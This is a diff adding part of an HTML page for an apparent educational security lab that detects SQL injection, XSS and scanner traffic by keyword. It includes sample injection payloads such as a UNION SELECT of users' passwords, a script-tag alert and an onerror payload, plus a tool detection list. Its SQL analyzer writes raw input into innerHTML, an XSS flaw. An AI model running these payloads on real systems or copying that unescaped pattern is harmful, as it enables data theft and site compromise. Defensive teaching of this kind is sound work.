+                    <p>Security technology that monitors application behavior at runtime and blocks attacks from within
+                        the application, providing context-aware threat detection.</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Web Application Firewall (WAF)</h4>
+                    <p>Network-level security device that inspects HTTP traffic and blocks malicious requests before
+                        reaching the application.</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Anomaly Detection</h4>
+                    <p>Machine learning technique that identifies unusual patterns that deviate from normal behavior,
+                        enabling detection of zero-day attacks.</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Entropy Analysis</h4>
+                    <p>Statistical measure of randomness/disorder in data. High entropy in user input suggests encoded
+                        payloads or obfuscation.</p>
+                </div>
+                <div class="feature-item">
+                    <h4>Ensemble Learning</h4>
+                    <p>Machine learning technique that combines multiple models to improve accuracy and robustness
+                        compared to single models.</p>
+                </div>
+                <div class="feature-item">
+                    <h4>False Positive Rate</h4>
+                    <p>Percentage of legitimate requests incorrectly flagged as threats. Lower rates mean less
+                        operational overhead.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Recommended Reading</h3>
+                <ul>
+                    <li>OWASP Web Application Security Testing Guide</li>
+                    <li>OWASP Top 10 Web Application Security Risks</li>
+                    <li>CWE Top 25 Most Dangerous Software Weaknesses</li>
+                    <li>NIST Cybersecurity Framework</li>
+                    <li>"The Web Application Hacker's Handbook" - Stuttard & Pinto</li>
+                    <li>SANS/CWE Top 25 Software Errors</li>
+                    <li>PortSwigger Web Security Academy</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Best Practices for Application Security</h3>
+                <ul>
+                    <li><strong>Input Validation:</strong> Validate all user input against expected format and length
+                    </li>
+                    <li><strong>Output Encoding:</strong> Encode output based on context (HTML, JavaScript, URL, CSS)
+                    </li>
+                    <li><strong>Parameterized Queries:</strong> Use prepared statements to prevent SQL injection</li>
+                    <li><strong>Least Privilege:</strong> Run applications with minimum required permissions</li>
+                    <li><strong>Security Headers:</strong> Implement CSP, X-Frame-Options, X-Content-Type-Options</li>
+                    <li><strong>HTTPS/TLS:</strong> Encrypt all communication in transit</li>
+                    <li><strong>Session Management:</strong> Use secure, random session tokens with proper expiration
+                    </li>
+                    <li><strong>Authentication:</strong> Implement MFA and secure password policies</li>
+                    <li><strong>Rate Limiting:</strong> Implement request rate limiting to prevent brute force attacks
+                    </li>
+                    <li><strong>Logging & Monitoring:</strong> Log all security-relevant events for forensic analysis
+                    </li>
+                </ul>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <p><strong>RASP-Lab © 2026</strong> | Runtime Application Self-Protection Laboratory</p>
+        <p>Educational & Research Platform for Cybersecurity Professionals and Students</p>
+        <p style="margin-top: 0.5rem; font-size: 0.85rem; color: var(--text-tertiary);">
+            Developed by @ <strong>Jagan bhasker</strong>
+        </p>
+    </footer>
+
+
+    <script>
+        function showSection(sectionId, element) {
+            // Hide all sections
+            const sections = document.querySelectorAll('section');
+            sections.forEach(section => {
+                section.classList.remove('active');
+            });
+
+            // Remove active class from all nav links
+            const navLinks = document.querySelectorAll('nav a');
+            navLinks.forEach(link => {
+                link.classList.remove('active');
+            });
+
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+
+            // Add active class to clicked nav link
+            element.classList.add('active');
+
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+
+
+        function analyzeSQL() {
+            const input = document.getElementById("sqlInput").value;
+            const resultBox = document.getElementById("sqlResult");
+            const riskBox = document.getElementById("riskIndicator");
+
+            if (!input) {
+                resultBox.innerText = "⚠️ Please enter a value to analyze.";
+                riskBox.innerHTML = "";
+                return;
+            }
+
+            const lower = input.toLowerCase();
+            let patternHtml = "";
+
+            // ---- UNION-based SQL Injection ----
+            if (lower.includes("union select")) {
+                patternHtml = `
+            <div class="risk-box high">
+                <div class="pattern-name">UNION-Based SQL Injection</div>
+                <div class="pattern-desc">
+                    The input contains UNION SELECT, allowing attackers to
+                    extract data from multiple database tables.
+                </div>
+                <div class="pattern-example">
+                    ${input}
+                </div>
+            </div>
+        `;
+            }
+
+            // ---- Boolean-based SQL Injection ----
+            else if (lower.includes("' or") || lower.includes("\" or")) {
+                patternHtml = `
+            <div class="risk-box high">
+                <div class="pattern-name">Boolean-Based SQL Injection</div>
+                <div class="pattern-desc">
+                    The input manipulates query logic using boolean conditions
+                    that always evaluate to true.
+                </div>
+                <div class="pattern-example">
+                    ${input}
+                </div>
+            </div>
+        `;
+            }
+
+            // ---- Comment-based SQL Injection ----
+            else if (lower.includes("--") || lower.includes("/*")) {
+                patternHtml = `
+            <div class="risk-box medium">
+                <div class="pattern-name">SQL Comment Injection</div>
+                <div class="pattern-desc">
+                    SQL comment characters detected. These are commonly used to
+                    truncate legitimate queries.
+                </div>
+                <div class="pattern-example">
+                    ${input}
+                </div>
+            </div>
+        `;
+            }
+
+            // ---- Generic suspicious SQL ----
+            else if (lower.includes("'") || lower.includes("=")) {
+                patternHtml = `
+            <div class="risk-box medium">
+                <div class="pattern-name">Suspicious SQL Pattern</div>
+                <div class="pattern-desc">
+                    Input contains characters frequently used in SQL
+                    manipulation attempts.
+                </div>
+                <div class="pattern-example">
+                    ${input}
+                </div>
+            </div>
+        `;
+            }
+
+            // ---- Normal input ----
+            else {
+                patternHtml = `
+            <div class="risk-box low">
+                <div class="pattern-name">Normal Input</div>
+                <div class="pattern-desc">
+                    No known SQL injection patterns were detected.
+                </div>
+                <div class="pattern-example">
+                    ${input}
+                </div>
+            </div>
+        `;
+            }
+
+            // 🔹 Backend call (silent – for RASP later)
+            fetch("/lab/sql?input=" + encodeURIComponent(input))
+                .then(() => {
+                    resultBox.innerText = ""; // ⛔ remove server response text
+                    riskBox.innerHTML = patternHtml;
+                })
+                .catch(() => {
+                    resultBox.innerText = "❌ Error contacting server.";
+                    riskBox.innerHTML = "";
+                });
+        }
+
+        function loadSQLExample1() {
+            document.getElementById("sqlInput").value = "' OR 1=1 --";
+        }
+
+        function loadSQLExample2() {
+            document.getElementById("sqlInput").value =
+                "' UNION SELECT username, password FROM users --";
+        }
+        function analyzeXSS() {
+            const input = document.getElementById("xssInput").value;
+            const riskBox = document.getElementById("xssRiskIndicator");
+
+            if (!input) {
+                riskBox.innerHTML = `
+            <div class="risk-box low">
+                <div class="pattern-name">No Input Provided</div>
+                <div class="pattern-desc">
+                    Please enter a payload to analyze for XSS risk.
+                </div>
+            </div>
+        `;
+                return;
+            }
+
+            const lower = input.toLowerCase();
+
+            let title = "Normal Input";
+            let desc = "No common Cross-Site Scripting patterns were detected.";
+            let severity = "low";
+
+            if (lower.includes("<script")) {
+                title = "Script Tag XSS";
+                desc = "Script tags detected. This payload attempts to execute arbitrary JavaScript.";
+                severity = "high";
+            } else if (lower.includes("onerror") || lower.includes("onload")) {
+                title = "Event Handler XSS";
+                desc = "Event-based JavaScript execution detected, commonly used in reflected and stored XSS attacks.";
+                severity = "high";
+            } else if (lower.includes("%3c") || lower.includes("&lt;")) {
+                title = "Encoded XSS Payload";
+                desc = "Encoded HTML characters detected. Attackers often use encoding to bypass filters.";
+                severity = "medium";
+            }
+
+            // 🔐 Build container WITHOUT payload
+            riskBox.innerHTML = `
+        <div class="risk-box ${severity}">
+            <div class="pattern-name">${title}</div>
+            <div class="pattern-desc">${desc}</div>
+            <div class="pattern-example" id="xssPayloadBox"></div>
+        </div>
+    `;
+
+            // 🔐 SAFELY insert payload as TEXT (not HTML)
+            document.getElementById("xssPayloadBox").textContent = input;
+
+            // Silent backend call (for RASP later)
+            fetch("/lab/xss?payload=" + encodeURIComponent(input)).catch(() => { });
+        }
+        function loadXSSExample1() {
+            document.getElementById("xssInput").value =
+                decodeURIComponent("%3Cscript%3Ealert('XSS')%3C/script%3E");
+        }
+
+        function loadXSSExample2() {
+            document.getElementById("xssInput").value =
+                decodeURIComponent("%3Cimg%20src=x%20onerror=alert('XSS')%3E");
+        }
+
+        function analyzeHTTP() {
+            const input = document.getElementById("httpInput").value;
+            const riskBox = document.getElementById("httpRiskIndicator");
+
+            let title = "Normal HTTP Request";
+            let desc = "Request structure appears consistent with legitimate browser traffic.";
+            let severity = "low";
+
+            if (input.length > 500) {
+                title = "Oversized Request Payload";
+                desc = "Large request bodies are commonly used in fuzzing and denial-of-service attempts.";
+                severity = "medium";
+            }
+            else if (input.toLowerCase().includes("sqlmap") ||
+                input.toLowerCase().includes("curl") ||
+                input.toLowerCase().includes("nikto")) {
+                title = "Automated Tool Detected";
+                desc = "Request resembles traffic generated by automated security scanning tools.";
+                severity = "high";
+            }
+
+            riskBox.innerHTML = `
+        <div class="risk-box ${severity}">
+            <div class="pattern-name">${title}</div>
+            <div class="pattern-desc">${desc}</div>
+            <div class="pattern-example" id="httpPayloadBox"></div>
+        </div>
+    `;
+
+            document.getElementById("httpPayloadBox").textContent =
+                input || "[Empty Body]";
+
+            // Silent backend call (for RASP later)
+            fetch("/lab/http", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "text/plain",
+                    "User-Agent": navigator.userAgent
+                },
+                body: input
+
+            }).catch(() => { });
+        }
+
+        function loadHTTPExample1() {
+            document.getElementById("httpInput").value =
+                "{ \"tool\": \"sqlmap\", \"action\": \"scan\" }";
+        }
+
+        function loadHTTPExample2() {
+            document.getElementById("httpInput").value =
+                "{ \"username\": \"admin\", \"password\": \"admin123\" }";
+        }
+
+    </script>
+    <script src="/js/script.js"></script>
+
+</body>
+
+</html>
